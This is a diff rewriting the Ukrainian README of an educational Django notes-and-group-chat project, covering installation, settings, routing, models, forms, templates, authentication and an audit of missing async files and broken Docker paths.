@@ -1,1490 +1,1336 @@
-# Crispy Notes Project: Sync vs Async Django
+# Notes Chat App
 
-> Навчальний проєкт для курсу Python/Django.
-> Демонструє **синхронний** і **асинхронний** Django паралельно на одному коді.
+Навчальний Django-проєкт для персональних нотаток, списків справ, списків покупок, групового доступу і WebSocket-чату.
 
----
+Цей репозиторій показує не тільки "як запустити застосунок", а й як мислити про великий Django-проєкт: де живе routing, де зберігаються models, чому views краще тримати тонкими, навіщо потрібні selectors і services, як templates збираються через inheritance, як працює authentication, authorization, sessions, Django Channels і WebSocket.
 
-## 00. Про що цей проєкт
+> Важливо: цей README описує поточний окремий репозиторій `notes_chat_app`, а не старі навчальні директорії з монорепозиторію. Усі шляхи нижче відносні до кореня цього репозиторію.
 
-Це вже готовий Django-додаток для нотаток (Notes, Notebooks, Tags, TodoList, ShoppingList).
-Ми **не переписуємо його з нуля** — ми додаємо async можливості **поруч** із sync-кодом.
+## Зміст
 
-**Дві демонстрації async в одному проєкті:**
+1. [Про проєкт](#1-про-проєкт)
+2. [Що реалізовано](#2-що-реалізовано)
+3. [Навчальна цінність](#3-навчальна-цінність)
+4. [Поточний стан після аудиту](#4-поточний-стан-після-аудиту)
+5. [Швидкий запуск](#5-швидкий-запуск)
+6. [Повне встановлення для початківця](#6-повне-встановлення-для-початківця)
+7. [Змінні середовища](#7-змінні-середовища)
+8. [Структура репозиторію](#8-структура-репозиторію)
+9. [Архітектура одним поглядом](#9-архітектура-одним-поглядом)
+10. [Як проходить HTTP request](#10-як-проходить-http-request)
+11. [URL routing](#11-url-routing)
+12. [Models і база даних](#12-models-і-база-даних)
+13. [Migrations](#13-migrations)
+14. [Selectors і services](#14-selectors-і-services)
+15. [Views](#15-views)
+16. [Forms і Crispy Forms](#16-forms-і-crispy-forms)
+17. [Templates, Bootstrap і static files](#17-templates-bootstrap-і-static-files)
+18. [Authentication, sessions і password flows](#18-authentication-sessions-і-password-flows)
+19. [Authorization і захист від IDOR](#19-authorization-і-захист-від-idor)
+20. [Груповий доступ](#20-груповий-доступ)
+21. [WebSocket-чат і Django Channels](#21-websocket-чат-і-django-channels)
+22. [JavaScript-клієнт чату](#22-javascript-клієнт-чату)
+23. [Sync, async, WSGI і ASGI](#23-sync-async-wsgi-і-asgi)
+24. [Тестування](#24-тестування)
+25. [GitHub Actions CI](#25-github-actions-ci)
+26. [Docker, PostgreSQL і Redis](#26-docker-postgresql-і-redis)
+27. [Підготовка до production](#27-підготовка-до-production)
+28. [Основні URL](#28-основні-url)
+29. [Типові помилки](#29-типові-помилки)
+30. [Навчальний маршрут](#30-навчальний-маршрут)
+31. [Практичні завдання](#31-практичні-завдання)
+32. [Словник термінів](#32-словник-термінів)
+33. [Куди рухатись далі](#33-куди-рухатись-далі)
 
+## 1. Про проєкт
+
+`Notes Chat App` - це Django-застосунок, який починається з класичного CRUD для нотаток, а поступово виростає до системи з:
+
+- обліковими записами користувачів;
+- приватними нотатками;
+- записниками;
+- тегами;
+- нагадуваннями;
+- todo lists;
+- shopping lists;
+- прямим sharing між користувачами;
+- групами на базі `django.contrib.auth.models.Group`;
+- груповими нотатками і списками покупок;
+- real-time груповим чатом через Django Channels;
+- unit, integration, consumer і Selenium E2E тестами;
+- CI workflow у GitHub Actions;
+- заготовками для Docker, PostgreSQL і Redis.
+
+Назва у UI: `CrispyNotes`. Назва репозиторію і застосунку: `notes_chat_app`.
+
+Головна навчальна ідея: студент має побачити, що Django-проєкт складається не з одного "магічного" файлу, а з шарів. Кожен шар відповідає за свою частину роботи.
+
+## 2. Що реалізовано
+
+| Напрям | Поточна реалізація |
+| --- | --- |
+| Django project package | `notes_project` |
+| Django app | `notes_app` |
+| Головний entrypoint | `manage.py` |
+| UI | Bootstrap 5 через CDN, Bootstrap Icons, власний CSS |
+| Forms | Django Forms + `django-crispy-forms` + `crispy-bootstrap5` |
+| Auth | Django built-in auth URLs, register view, login/logout, password reset/change templates |
+| Notes | CRUD, пошук, фільтр за notebook/tag, priority, pinned, archived field |
+| Notebooks | CRUD, default notebook flag, color |
+| Tags | створення, нормалізація назви, унікальність у межах user |
+| Reminders | створення і видалення нагадувань для нотаток |
+| Todo lists | CRUD, items, toggle, sharing з іншим user |
+| Shopping lists | CRUD, items, price estimate, toggle purchased, sharing з іншим user |
+| Groups | створення, членство, додавання/видалення учасників, вихід з групи |
+| Group sharing | `Note.group` і `ShoppingList.group` |
+| WebSocket chat | `GroupChatConsumer`, `ChatMessage`, `/ws/groups/<pk>/chat/` |
+| Channel layer | Redis якщо є `REDIS_URL`, інакше `InMemoryChannelLayer` |
+| DB локально | SQLite через `db.sqlite3`, створюється після `migrate` |
+| DB у Docker/settings | PostgreSQL через `DATABASE_URL` |
+| Tests | `notes_app/tests/` |
+| CI | `.github/workflows/django-tests.yml` |
+
+## 3. Навчальна цінність
+
+Після вивчення цього репозиторію студент має розуміти:
+
+- що таке Django project і Django app;
+- як `urls.py` направляє request до view;
+- чим відрізняються `model`, `form`, `view`, `template`;
+- як працює ORM і чому QuerySet лінивий;
+- навіщо існують migrations;
+- чому `selectors.py` читає дані, а `services.py` змінює дані;
+- як `login_required` захищає сторінки;
+- чому authentication не дорівнює authorization;
+- що таке IDOR і чому треба фільтрувати об'єкти за user/group;
+- як працює template inheritance;
+- як Crispy Forms прибирає дублювання Bootstrap HTML;
+- як session cookie дозволяє Django пам'ятати user;
+- чим HTTP request/response відрізняється від WebSocket;
+- чому WebSocket потребує ASGI і Consumer;
+- чому `InMemoryChannelLayer` підходить для навчання, але не для production з кількома процесами;
+- як запускати Django checks, tests і CI.
+
+## 4. Поточний стан після аудиту
+
+Цей README написано за фактичним станом файлів у репозиторії. Є кілька важливих моментів, які треба знати перед запуском.
+
+| Перевірка | Стан |
+| --- | --- |
+| Git remote | `https://github.com/NikoriakViktot/notes_chat_app.git` |
+| Python у WSL під час аудиту | `Python 3.12.3` |
+| Django dependency | у `requirements.txt`: `Django>=5.2,<6.0` |
+| Local dependency state | `python3 manage.py check` не дійшов до Django check, бо у поточному WSL Python не встановлено `django` |
+| Async HTTP demo files | `notes_app/urls.py` імпортує `async_views`, але `notes_app/async_views.py`, `async_selectors.py`, `async_services.py` у working tree відсутні |
+| WebSocket chat | файли `notes_project/asgi.py`, `notes_project/routing.py`, `notes_app/consumers.py`, `ChatMessage`, `group_chat.js` присутні |
+| Docker files | присутні, але `docker-compose.yml` має `build: notes`, а `Dockerfile` має `COPY notes .`; директорії `notes/` у корені немає |
+
+Практичний наслідок:
+
+- спочатку встановіть залежності у virtual environment;
+- потім запустіть `python manage.py check`;
+- якщо після встановлення залежностей Django впаде на `ImportError` через `async_views`, треба або відновити async-файли, або прибрати async routes з `notes_app/urls.py`;
+- Docker-команди не варто вважати готовими до запуску, доки не виправлено build context і `COPY` шлях.
+
+## 5. Швидкий запуск
+
+Цей сценарій для користувача, який уже розуміє Git, virtual environment і pip.
+
+```bash
+git clone https://github.com/NikoriakViktot/notes_chat_app.git
+cd notes_chat_app
+
+python -m venv .venv
+source .venv/bin/activate
+
+python -m pip install --upgrade pip
+pip install -r requirements.txt
+
+python manage.py migrate
+python manage.py createsuperuser
+python manage.py runserver
 ```
-# Частина 1: Async views (той самий результат — різна архітектура)
-http://127.0.0.1:8000/notes/          ← Sync view (класичний Django)
-http://127.0.0.1:8001/async/notes/    ← Async view (той самий результат, async ORM)
 
-# Частина 2: Real-time чат (тут async — єдиний правильний підхід)
-http://127.0.0.1:8001/groups/<pk>/chat/   ← Груповий WebSocket чат
+Відкрийте:
+
+- `http://127.0.0.1:8000/` - стартова сторінка;
+- `http://127.0.0.1:8000/register/` - реєстрація;
+- `http://127.0.0.1:8000/accounts/login/` - вхід;
+- `http://127.0.0.1:8000/notes/` - список нотаток;
+- `http://127.0.0.1:8000/admin/` - Django admin.
+
+Для явного ASGI-запуску, потрібного для WebSocket-чату:
+
+```bash
+uvicorn notes_project.asgi:application --reload --port 8001
 ```
 
-Async views і async ORM показують **як** писати async код.
-Груповий чат показує **навіщо** async потрібен — тут sync просто не підходить.
+Після цього відкрийте:
 
----
+- `http://127.0.0.1:8001/groups/` - групи;
+- `http://127.0.0.1:8001/groups/<pk>/chat/` - сторінка групового чату;
+- WebSocket endpoint: `ws://127.0.0.1:8001/ws/groups/<pk>/chat/`.
 
-## 01. Що студент вивчить
+## 6. Повне встановлення для початківця
 
-Після проходження цього проєкту ти зрозумієш:
+### 6.1. Що таке клонування
 
-**Async views та ORM:**
-- [ ] Чому `async def view` не стає корисним просто від написання `async`
-- [ ] Що таке lazy QuerySet і де SQL реально виконується
-- [ ] Як `async for` замінює `for` при ітерації по QuerySet
-- [ ] Коли і чому `sync_to_async` потрібен для `transaction.atomic()`
-- [ ] Як запустити Django під ASGI через Uvicorn
-- [ ] Як писати тести для async views через `AsyncClient`
-- [ ] Що `aupdate()` + `F()` — атомарний SQL UPDATE без завантаження об'єкта
+Клонування - це створення локальної копії GitHub-репозиторію на вашому комп'ютері.
 
-**Real-time чат (Django Channels + WebSocket):**
-- [ ] Чому HTTP не підходить для real-time і де async стає необхідністю
-- [ ] Що таке WebSocket і як він відрізняється від HTTP
-- [ ] Що таке Consumer і як він відрізняється від View
-- [ ] Як channel layer доставляє повідомлення всім учасникам (pub/sub)
-- [ ] Як `ProtocolTypeRouter` об'єднує HTTP і WebSocket в одному ASGI-процесі
-- [ ] Як `AuthMiddlewareStack` автентифікує WebSocket-з'єднання
-- [ ] Що таке `database_sync_to_async` і навіщо він потрібен у Consumer
+```bash
+git clone https://github.com/NikoriakViktot/notes_chat_app.git
+cd notes_chat_app
+```
 
----
+`cd notes_chat_app` переводить термінал у корінь репозиторію. Саме з цього місця треба виконувати `python manage.py ...`.
 
-## 02. Архітектура проєкту
+### 6.2. Windows PowerShell
+
+```powershell
+git clone https://github.com/NikoriakViktot/notes_chat_app.git
+cd notes_chat_app
+
+py -3.12 -m venv .venv
+.\.venv\Scripts\Activate.ps1
+
+python -m pip install --upgrade pip
+pip install -r requirements.txt
+
+python manage.py migrate
+python manage.py createsuperuser
+python manage.py runserver
+```
+
+Якщо PowerShell не дозволяє активувати venv:
+
+```powershell
+Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
+.\.venv\Scripts\Activate.ps1
+```
+
+### 6.3. Linux, macOS або WSL
+
+```bash
+git clone https://github.com/NikoriakViktot/notes_chat_app.git
+cd notes_chat_app
+
+python3 -m venv .venv
+source .venv/bin/activate
+
+python -m pip install --upgrade pip
+pip install -r requirements.txt
+
+python manage.py migrate
+python manage.py createsuperuser
+python manage.py runserver
+```
+
+### 6.4. Навіщо virtual environment
+
+Virtual environment - це ізольована папка з Python-пакетами саме для цього проєкту.
+
+Без venv залежності різних проєктів змішуються. Один проєкт може потребувати Django 5.2, інший - Django 4.2, і глобальна установка швидко стає хаотичною.
+
+### 6.5. Що роблять команди
+
+| Команда | Що робить |
+| --- | --- |
+| `python -m venv .venv` | створює ізольоване Python-середовище |
+| `source .venv/bin/activate` | активує venv у Linux/macOS/WSL |
+| `.\.venv\Scripts\Activate.ps1` | активує venv у PowerShell |
+| `python -m pip install --upgrade pip` | оновлює installer пакетів |
+| `pip install -r requirements.txt` | встановлює Django, Channels, Crispy Forms, Selenium та інші залежності |
+| `python manage.py migrate` | створює таблиці БД за migrations |
+| `python manage.py createsuperuser` | створює admin user |
+| `python manage.py runserver` | запускає development server |
+| `Ctrl+C` | зупиняє server у терміналі |
+
+Development server зручний для навчання, але не є production server. У production потрібні окремі налаштування: `DEBUG=False`, `ALLOWED_HOSTS`, HTTPS, application server, reverse proxy, static files, logging і secrets через environment.
+
+## 7. Змінні середовища
+
+У корені є `.env.example`. Його можна скопіювати у `.env`, але важливо розуміти: сам `settings.py` зараз напряму читає тільки `DATABASE_URL` і `REDIS_URL` через `os.environ.get(...)`. Автоматичного завантаження `.env` файлу через `python-dotenv` або `django-environ` у поточному коді немає.
+
+```bash
+cp .env.example .env
+```
+
+Поточні змінні з `.env.example`:
+
+| Змінна | Для чого |
+| --- | --- |
+| `POSTGRES_DB` | назва PostgreSQL database для Docker |
+| `POSTGRES_USER` | user PostgreSQL для Docker |
+| `POSTGRES_PASSWORD` | password PostgreSQL для Docker |
+| `SECRET_KEY` | має бути secret у production, але поточний `settings.py` його ще не читає |
+| `DATABASE_URL` | якщо задано, Django перемикається з SQLite на PostgreSQL |
+| `REDIS_URL` | якщо задано, Channels використовує Redis channel layer |
+| `SELENIUM_REMOTE_URL` | remote Selenium WebDriver для E2E тестів |
+| `WEB_HOST` | hostname web-сервісу для Docker/Selenium сценаріїв |
+
+### 7.1. Database selection
+
+У `notes_project/settings.py` логіка така:
+
+- якщо `DATABASE_URL` задано, використовується PostgreSQL;
+- якщо `DATABASE_URL` не задано, використовується SQLite файл `db.sqlite3`;
+- для тестів SQLite має файлову test DB `test_db.sqlite3`, щоб live server і Channels tests могли працювати між потоками.
+
+### 7.2. Channel layer selection
+
+У `notes_project/settings.py`:
+
+- якщо є `REDIS_URL`, використовується `channels_redis.core.RedisChannelLayer`;
+- якщо `REDIS_URL` немає, використовується `channels.layers.InMemoryChannelLayer`.
+
+`InMemoryChannelLayer` підходить для навчального запуску в одному процесі. Для production з кількома workers потрібен Redis.
+
+## 8. Структура репозиторію
+
+```text
+.
+├── manage.py
+├── requirements.txt
+├── .env.example
+├── Dockerfile
+├── docker-compose.yml
+├── entrypoint.sh
+├── run_server.ps1
+├── .github/
+│   └── workflows/
+│       └── django-tests.yml
+├── notes_project/
+│   ├── settings.py
+│   ├── urls.py
+│   ├── asgi.py
+│   ├── wsgi.py
+│   ├── routing.py
+│   └── middleware.py
+├── notes_app/
+│   ├── models.py
+│   ├── admin.py
+│   ├── forms.py
+│   ├── views.py
+│   ├── urls.py
+│   ├── selectors.py
+│   ├── services.py
+│   ├── consumers.py
+│   ├── context_processors.py
+│   ├── migrations/
+│   ├── static/
+│   │   └── notes_app/
+│   │       ├── css/app.css
+│   │       └── js/group_chat.js
+│   ├── templates/
+│   │   └── notes_app/
+│   └── tests/
+├── templates/
+│   ├── base.html
+│   ├── layouts/dashboard.html
+│   ├── components/
+│   └── registration/
+├── static/
+│   └── css/project.css
+├── staticfiles/
+└── raw/
+    ├── README_1.md
+    ├── README_2.md
+    ├── README_3.md
+    ├── README_4.md
+    ├── README_5.md
+    ├── README_6.md
+    ├── README_7.md
+    └── README_8.md
+```
+
+`raw/README_*.md` - історичні навчальні матеріали. Вони корисні як пояснення еволюції, але не всі шляхи та приклади з них відповідають поточному окремому репозиторію.
+
+## 9. Архітектура одним поглядом
 
 ```mermaid
 flowchart TD
-    Browser["Браузер / Postman"] --> ASGI["Uvicorn ASGI\n:8001"]
-    Browser --> WSGI["runserver WSGI\n:8000"]
-
-    ASGI --> PTR["ProtocolTypeRouter\nasgi.py"]
-    PTR -->|"http"| URLs["hello_app/urls.py"]
-    PTR -->|"websocket"| WS["WebSocket URLRouter\nhello_project/routing.py"]
-
-    WSGI --> URLs
-
-    URLs --> SyncViews["views.py\nsync views\n/notes/, /groups/, ..."]
-    URLs --> AsyncViews["async_views.py\nasync views\n/async/notes/"]
-    URLs --> ChatView["views.group_chat()\n/groups/&lt;pk&gt;/chat/"]
-
-    WS --> Consumer["consumers.GroupChatConsumer\n/ws/groups/&lt;pk&gt;/chat/"]
-
-    SyncViews --> Selectors["selectors.py"]
-    SyncViews --> Services["services.py"]
-    AsyncViews --> AsyncSelectors["async_selectors.py"]
-    AsyncViews --> AsyncServices["async_services.py"]
-
-    Consumer --> ChannelLayer["InMemoryChannelLayer\n(pub/sub broadcast)"]
-    ChannelLayer --> Consumer
-
-    Selectors --> DB[("SQLite DB")]
-    Services --> DB
-    AsyncSelectors --> DB
-    AsyncServices --> DB
-    Consumer --> DB
-    ChatView --> DB
+    Browser["Browser"] --> Urls["notes_project/urls.py"]
+    Urls --> AppUrls["notes_app/urls.py"]
+    AppUrls --> Views["notes_app/views.py"]
+    Views --> Selectors["notes_app/selectors.py"]
+    Views --> Services["notes_app/services.py"]
+    Selectors --> Models["notes_app/models.py"]
+    Services --> Models
+    Models --> DB["SQLite або PostgreSQL"]
+    Views --> Forms["notes_app/forms.py"]
+    Views --> Templates["templates + notes_app/templates"]
+    Templates --> Static["static + notes_app/static"]
 ```
 
-### Таблиця файлів
+Коротко по шарах:
 
-| Файл | Роль | Чи змінювали? |
-|------|------|---------------|
-| `models.py` | 9 моделей: Note, Notebook, Tag, ..., **ChatMessage** | ✅ Додали ChatMessage |
-| `views.py` | 50+ sync views + **group_chat** | ✅ Додали group_chat |
-| `selectors.py` | Sync ORM SELECT-запити | ❌ Без змін |
-| `services.py` | Sync business logic | ❌ Без змін |
-| `forms.py` | Django Forms | ❌ Без змін |
-| **`async_selectors.py`** | **Async ORM SELECT-запити** | **✅ Новий** |
-| **`async_services.py`** | **Async business logic** | **✅ Новий** |
-| **`async_views.py`** | **Async def views** | **✅ Новий** |
-| **`consumers.py`** | **WebSocket Consumer (Django Channels)** | **✅ Новий** |
-| **`tests/test_async_views.py`** | **Async тести** | **✅ Новий** |
-| `urls.py` | URL routing | ✅ Додали async URLs + chat |
-| `requirements.txt` | Залежності | ✅ Додали uvicorn, httpx, channels |
-| `settings.py` | Конфігурація Django | ✅ CHANNEL_LAYERS, channels у INSTALLED_APPS |
-| `asgi.py` | ASGI точка входу | ✅ ProtocolTypeRouter |
-| **`hello_project/routing.py`** | **WebSocket URL patterns** | **✅ Новий** |
-| **`static/hello_app/js/group_chat.js`** | **Vanilla JS WebSocket клієнт** | **✅ Новий** |
+| Шар | Файл | Відповідальність |
+| --- | --- | --- |
+| Project config | `notes_project/settings.py` | apps, middleware, DB, static, auth, Channels |
+| HTTP routing | `notes_project/urls.py`, `notes_app/urls.py` | URL -> view |
+| WebSocket routing | `notes_project/routing.py` | WS URL -> Consumer |
+| HTTP layer | `notes_app/views.py` | request, permissions, form handling, render/redirect |
+| Read layer | `notes_app/selectors.py` | SELECT queries |
+| Write layer | `notes_app/services.py` | create/update/delete, transactions |
+| Domain model | `notes_app/models.py` | tables, fields, relationships, constraints |
+| Forms | `notes_app/forms.py` | validation, field filtering, Crispy layout |
+| Templates | `templates/`, `notes_app/templates/` | HTML pages |
+| Static | `static/`, `notes_app/static/` | CSS і JavaScript |
+| WebSocket | `notes_app/consumers.py` | long-lived chat connection |
 
----
+## 10. Як проходить HTTP request
 
-## 03. Sync-версія: класичний Django
-
-Sync-код в цьому проєкті — це стандартний Django без жодних змін.
-
-### Як працює sync request
+Приклад: користувач відкриває `GET /notes/?q=django`.
 
 ```mermaid
 sequenceDiagram
-    participant Browser as Браузер
-    participant Django as Django (WSGI)
-    participant View as views.note_list()
-    participant Selector as selectors.get_user_notes()
-    participant DB as SQLite
+    participant B as Browser
+    participant U as URLconf
+    participant V as note_list view
+    participant S as selectors.py
+    participant M as Django ORM
+    participant T as Template
 
-    Browser->>Django: GET /notes/
-    Django->>View: Викликає note_list(request)
-    View->>Selector: get_user_notes(user, ...)
-    Selector->>DB: SELECT * FROM notes WHERE user=... JOIN ...
-    Note over Django: Потік ЗАБЛОКОВАНИЙ — чекає DB
-    DB-->>Selector: Рядки даних
-    Selector-->>View: QuerySet
-    View-->>Django: render(template, context)
-    Django-->>Browser: HTML 200 OK
+    B->>U: GET /notes/?q=django
+    U->>V: route to note_list(request)
+    V->>S: get_user_notes(user, search="django")
+    S->>M: build QuerySet with filters
+    V->>T: render note_list.html with QuerySet
+    T->>M: iterate QuerySet, SQL executes
+    T-->>B: HTML response
 ```
 
-### Sync URL-и
+Важлива думка: `selectors.get_user_notes(...)` повертає QuerySet. QuerySet у Django лінивий. SQL часто виконується не в момент створення QuerySet, а коли template починає його перебирати.
 
-| URL | Метод | View | Що робить |
-|-----|-------|------|-----------|
-| `/notes/` | GET | `note_list` | Список нотаток |
-| `/notes/<pk>/` | GET | `note_detail` | Деталі нотатки |
-| `/notes/new/` | GET/POST | `note_create` | Форма створення |
-| `/notes/<pk>/edit/` | GET/POST | `note_edit` | Форма редагування |
-| `/notes/<pk>/delete/` | GET/POST | `note_delete` | Видалення |
+## 11. URL routing
 
----
+### 11.1. Project-level URLs
 
-## 04. Async-версія: що ми додали і чому
+Файл: `notes_project/urls.py`.
 
-Ми додали нові файли **не змінюючи** sync-код.
-Студент може відкрити `views.py` і `async_views.py` поруч і побачити різницю.
+| URL | Що підключає |
+| --- | --- |
+| `/admin/` | Django admin |
+| `/accounts/` | built-in auth URLs: login, logout, password change/reset |
+| `/` | `notes_app.urls` |
+| `__debug__/` | debug toolbar URLs через `debug_toolbar_urls()` |
 
-### Як працює async request
+### 11.2. App-level URLs
+
+Файл: `notes_app/urls.py`.
+
+| URL | View | Призначення |
+| --- | --- | --- |
+| `/` | `index` | landing/index, redirect для authenticated user |
+| `/register/` | `register` | створення user і auto-login |
+| `/notes/` | `note_list` | список нотаток |
+| `/notes/new/` | `note_create` | створення нотатки |
+| `/notes/<pk>/` | `note_detail` | деталі нотатки |
+| `/notes/<pk>/edit/` | `note_edit` | редагування |
+| `/notes/<pk>/delete/` | `note_delete` | підтвердження і видалення |
+| `/notebooks/` | `notebook_list` | список записників |
+| `/notebooks/new/` | `notebook_create` | створення записника |
+| `/notebooks/<pk>/edit/` | `notebook_edit` | редагування записника |
+| `/notebooks/<pk>/delete/` | `notebook_delete` | видалення записника |
+| `/tags/new/` | `tag_create` | створення тегу |
+| `/todo/` | `todo_list_list` | списки справ |
+| `/todo/new/` | `todo_list_create` | новий список справ |
+| `/todo/<pk>/` | `todo_list_detail` | деталі todo list |
+| `/todo/<pk>/share/` | `todo_list_share` | direct sharing |
+| `/shopping/` | `shopping_list_list` | списки покупок |
+| `/shopping/new/` | `shopping_list_create` | новий список покупок |
+| `/shopping/<pk>/` | `shopping_list_detail` | деталі shopping list |
+| `/shopping/<pk>/share/` | `shopping_list_share` | direct sharing |
+| `/groups/` | `group_list` | групи користувача |
+| `/groups/new/` | `group_create` | створення групи |
+| `/groups/<pk>/` | `group_detail` | учасники групи |
+| `/groups/<pk>/chat/` | `group_chat` | HTML-сторінка чату |
+
+### 11.3. WebSocket URLs
+
+Файл: `notes_project/routing.py`.
+
+| URL | Consumer | Призначення |
+| --- | --- | --- |
+| `/ws/groups/<group_pk>/chat/` | `GroupChatConsumer` | real-time чат групи |
+
+### 11.4. Async HTTP routes
+
+У `notes_app/urls.py` також оголошено:
+
+```text
+/async/notes/
+/async/notes/create/
+/async/notes/<pk>/
+/async/notes/<pk>/delete/
+/async/notes/<pk>/pin/
+```
+
+Але у поточному working tree файли `notes_app/async_views.py`, `notes_app/async_selectors.py`, `notes_app/async_services.py` відсутні. Тому цей блок зараз є не робочою функцією, а неузгодженістю між URLs і файлами.
+
+## 12. Models і база даних
+
+Файл: `notes_app/models.py`.
+
+```mermaid
+erDiagram
+    AUTH_USER ||--|| USER_PROFILE : has
+    AUTH_USER ||--o{ NOTEBOOK : owns
+    AUTH_USER ||--o{ TAG : owns
+    AUTH_USER ||--o{ NOTE : owns
+    AUTH_USER ||--o{ TODO_LIST : owns
+    AUTH_USER ||--o{ SHOPPING_LIST : owns
+    AUTH_GROUP ||--o{ NOTE : shares
+    AUTH_GROUP ||--o{ SHOPPING_LIST : shares
+    AUTH_GROUP ||--o{ CHAT_MESSAGE : contains
+    NOTEBOOK ||--o{ NOTE : groups
+    NOTE }o--o{ TAG : tagged
+    NOTE ||--o{ REMINDER : has
+    TODO_LIST ||--o{ TODO_ITEM : contains
+    SHOPPING_LIST ||--o{ SHOP_ITEM : contains
+    AUTH_USER ||--o{ CHAT_MESSAGE : writes
+```
+
+### 12.1. Model table
+
+| Model | Основна роль |
+| --- | --- |
+| `UserProfile` | профіль user: display name, avatar URL, timezone, bio |
+| `Tag` | user-owned тег з name і color |
+| `Notebook` | user-owned записник для нотаток |
+| `Note` | нотатка з priority, pinned/archive flags, notebook, tags, optional group |
+| `Reminder` | дата/час нагадування для note |
+| `TodoList` | список справ, owner і `shared_with` users |
+| `TodoItem` | item всередині todo list |
+| `ShoppingList` | список покупок, owner, optional group, `shared_with` users |
+| `ShopItem` | товар, quantity, unit, estimated price |
+| `ChatMessage` | повідомлення групового чату |
+
+### 12.2. Корисні constraints та indexes
+
+У коді є приклади реальних DB-level правил:
+
+- `Tag.unique_together = [('user', 'name')]` - user не може мати два однакові теги;
+- `Note.priority` має validators і `CheckConstraint` від 1 до 4;
+- `Note` має indexes для `user + updated_at` і `user + is_pinned`;
+- `ShopItem.quantity` має validator і DB constraint `quantity > 0`;
+- `ChatMessage` має index `group + timestamp`, бо чат читає останні повідомлення групи.
+
+## 13. Migrations
+
+Фактичні migrations:
+
+| Migration | Що додає |
+| --- | --- |
+| `0001_initial.py` | базові моделі notes/notebooks/tags/reminders/todo/shopping/profile |
+| `0002_shoppinglist_shared_with_todolist_shared_with.py` | direct sharing для todo і shopping lists |
+| `0003_note_group_shoppinglist_group.py` | group sharing для notes і shopping lists |
+| `0004_chatmessage.py` | `ChatMessage` для WebSocket-чату |
+
+Основні команди:
+
+```bash
+python manage.py makemigrations
+python manage.py migrate
+python manage.py showmigrations
+python manage.py sqlmigrate notes_app 0004
+```
+
+`makemigrations` створює Python-опис зміни схеми. `migrate` застосовує ці зміни до database.
+
+## 14. Selectors і services
+
+Файли:
+
+- `notes_app/selectors.py`;
+- `notes_app/services.py`.
+
+Це архітектурний поділ, який робить великий Django-код читабельнішим.
+
+| Файл | Що дозволено | Що не варто робити |
+| --- | --- | --- |
+| `selectors.py` | SELECT, filters, annotations, prefetch/select_related | INSERT/UPDATE/DELETE |
+| `services.py` | create/update/delete, transactions, business rules | render, redirect, HTTP response |
+| `views.py` | request, form, messages, permissions, redirect/render | складний ORM і business logic прямо у view |
+
+### 14.1. Приклад selector
+
+`get_user_notes(user, search=..., tag=..., notebook=...)`:
+
+- бере власні нотатки user;
+- додає нотатки груп, у яких user є учасником;
+- фільтрує archived state;
+- додає optional search/tag/notebook filters;
+- використовує `select_related` для FK;
+- використовує `prefetch_related` для tags;
+- сортує pinned -> priority -> updated.
+
+Це одночасно і security rule, і performance rule.
+
+### 14.2. Приклад service
+
+`create_note(...)`:
+
+- відкриває `transaction.atomic()`;
+- створює `Note`;
+- фільтрує tag ids за поточним user;
+- прив'язує tags через M2M;
+- повертає створений object.
+
+Service приховує business operation за одним зрозумілим викликом. View не повинна знати всі деталі запису в БД.
+
+## 15. Views
+
+Файл: `notes_app/views.py`.
+
+Поточна реалізація використовує Function-Based Views. У старих навчальних README є матеріал про Class-Based Views, але у фактичному `views.py` класів `ListView`, `CreateView`, `UpdateView`, `DeleteView` зараз немає.
+
+Типовий view у цьому проєкті:
+
+1. перевіряє authentication через `@login_required`;
+2. читає URL params або query params;
+3. отримує object через selector або `get_object_or_404`;
+4. перевіряє ownership/group membership;
+5. для POST створює form і викликає service;
+6. додає Django message;
+7. робить redirect після успішного POST;
+8. для GET рендерить template.
+
+Це відповідає PRG pattern: POST -> Redirect -> GET. Після успішної зміни даних browser не залишається на POST response, тому refresh не повторить створення/видалення.
+
+## 16. Forms і Crispy Forms
+
+Файл: `notes_app/forms.py`.
+
+Проєкт використовує `django-crispy-forms` і `crispy-bootstrap5`. Ідея: validation лишається Django-логікою, а Bootstrap layout описується у Python через `FormHelper` і `Layout`.
+
+### 16.1. Важливі форми
+
+| Form | Для чого |
+| --- | --- |
+| `NoteForm` | створення/редагування нотатки, filter queryset за user |
+| `NotebookForm` | записник, color picker, default flag |
+| `TagForm` | тег, color picker, `clean_name()` |
+| `TodoListForm` | список справ |
+| `TodoItemForm` | inline форма item, `form_tag=False` |
+| `ShoppingListForm` | список покупок, optional group |
+| `ShopItemForm` | inline товар |
+| `ReminderForm` | datetime-local нагадування |
+| `ShareForm` | direct sharing за username |
+| `GroupCreateForm` | створення group |
+| `GroupAddMemberForm` | додавання учасника group |
+
+### 16.2. Security у forms
+
+`NoteForm.__init__(..., user=request.user)` фільтрує:
+
+- notebooks тільки поточного user;
+- tags тільки поточного user;
+- groups тільки groups, де user є учасником.
+
+Без цього Alice могла б побачити чужі notebooks/tags/groups у dropdown. Це була б не тільки UI-помилка, а й potential data leak.
+
+## 17. Templates, Bootstrap і static files
+
+Головні template layers:
+
+```text
+templates/base.html
+└── templates/layouts/dashboard.html
+    └── notes_app/templates/notes_app/*.html
+```
+
+`base.html`:
+
+- задає HTML skeleton;
+- підключає Bootstrap 5 CDN;
+- підключає Bootstrap Icons;
+- підключає `notes_app/css/app.css`;
+- має blocks `title`, `body`, `content`, `extra_css`, `extra_js`.
+
+`layouts/dashboard.html`:
+
+- додає sidebar;
+- додає topbar;
+- показує Django messages як Bootstrap alerts;
+- використовує дані з `sidebar_context`.
+
+`notes_app/context_processors.py` автоматично додає у кожен template:
+
+- `sidebar_notebooks`;
+- `sidebar_tags`;
+- `sidebar_todo_count`;
+- `sidebar_shopping_count`;
+- `sidebar_groups`.
+
+Так view не дублює один і той самий код для sidebar на кожній сторінці.
+
+## 18. Authentication, sessions і password flows
+
+Authentication - це відповідь на питання "хто ти?". У цьому проєкті:
+
+- `/register/` створює user через `UserCreationForm`;
+- `/accounts/login/` надає Django built-in login view;
+- `/accounts/logout/` завершує session;
+- `/accounts/password_change/` і password reset routes приходять з `django.contrib.auth.urls`;
+- templates для auth живуть у `templates/registration/`.
+
+Після login Django створює session і ставить browser cookie. Далі `AuthenticationMiddleware` читає cookie, знаходить session і заповнює `request.user`.
+
+Важливі settings:
+
+| Setting | Поточне значення |
+| --- | --- |
+| `LOGIN_URL` | `/accounts/login/` |
+| `LOGIN_REDIRECT_URL` | `/notes/` |
+| `LOGOUT_REDIRECT_URL` | `/accounts/login/` |
